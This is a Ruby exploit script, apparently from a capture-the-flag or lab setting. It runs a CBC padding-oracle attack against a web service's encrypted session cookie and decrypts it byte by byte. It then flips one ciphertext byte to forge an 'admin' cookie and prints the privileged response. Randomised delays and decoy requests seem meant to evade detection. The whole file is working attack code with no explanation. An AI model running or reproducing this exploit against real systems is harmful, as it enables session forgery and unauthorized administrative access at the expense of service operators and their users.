#encoding: ASCII-8BIT
require 'net/http'
require 'uri'

$host = ARGV[0]
$port = ARGV[1].to_i

def get_resp http, cookie=nil
  uri = URI("http://#{$host}:#{$port}/")
  req = Net::HTTP::Get.new uri
  req['Cookie'] = "userdata=#{cookie}" if cookie
  http.request req
end

def get_cookie http, cookie=nil
  resp = get_resp http, cookie
  cookie = resp['Set-Cookie']
  return nil unless cookie
  cookie.split(';').first.split('=').last
end

NON_PRINTABLE = (0..31).to_a + (127..255).to_a
PRIO_LIST = (('a'..'z').to_a + ('A'..'Z').to_a + ('0'..'9').to_a).map(&:ord) + # alphanumeric
            (32..47).to_a + (58..64).to_a + (91..96).to_a + (123..126).to_a + # printable
            NON_PRINTABLE

def is_padding_ok http, cookie
  r = get_resp http, cookie
  !(r.body.include? 'invalid authentication')
end

def make_printable_ansi text
  text.chars.map { |c|
    if NON_PRINTABLE.include? c.ord
      "\x1b[37;44m#{"%02x" % c.ord}\x1b[0m"
    else
      c
    end
  }.join
end

def cbc_padding_oracle http, cookie
  iv = cookie[0..31]
  ct = cookie[32..-1]
  pt = ''

  blocks = ct.length / 32
  blocki = 1

  while ct.length >= 32
    block = ct[0..31]
    ct = ct[32..-1]

    recovered = ''
    iv = [iv].pack('H*')
    15.downto(0).each { |i|
      test = iv.dup
      15.downto(i+1).each { |j|
        test[j] = (test[j].ord ^ recovered[j-(i+1)].ord ^ (16-i)).chr
      }
      found = false
      PRIO_LIST.each { |guess|
        test2 = test.dup
        next if guess == (16-i)
        test2[i] = (test2[i].ord ^ guess ^ (16-i)).chr

        cookie = test2.unpack('H*').first+block

        print "\x1b[2J\x1b[H"
        print "Block #{blocki}/#{blocks}, byte #{i}: guessing 0x#{"%02x" % guess}, differential: "
        print (iv+[block].pack('H*')).bytes.zip([cookie].pack('H*').bytes[0...32]).map { |a,b| "%02x" % (a^b) }.join
        puts "\nCurrently recovered plaintext:"

        print make_printable_ansi(pt)
        print "\x1b[30;47m" + " "*(i+1) + "\x1b[0m"
        puts make_printable_ansi(recovered)

        if is_padding_ok http, cookie
          found = true
          recovered = guess.chr + recovered
          break
        end
      }
      recovered = (16-i).chr + recovered unless found
    }

    pt += recovered
    iv = block
    blocki += 1
  end
  print "\x1b[2J\x1b[H"

  padding = pt[-1].ord
  pt[0...-padding]
end

((Random.rand * 3).round + 1).times {
  Net::HTTP.start(ARGV.first, ARGV.last.to_i) do |http|
    get_resp http
  end

  sleep 3+Random.rand*7
}

Net::HTTP.start(ARGV.first, ARGV.last.to_i) do |http|
  base = get_cookie http

  cookie = cbc_padding_oracle(http, base)
  puts "Cookie contents: #{cookie}"
end

sleep 3+Random.rand*7

Net::HTTP.start(ARGV.first, ARGV.last.to_i) do |http|
  evil = get_cookie(http)
  puts "Got a fresh cookie from the service: #{evil}"
  evil = [evil].pack('H*')
  evil[9]=(evil[9].ord ^ 1).chr
  evil = evil.unpack('H*').first
  puts "Flipped the admin bit: #{evil}"
  puts "Got as response:"
  puts get_resp(http, evil).body
end
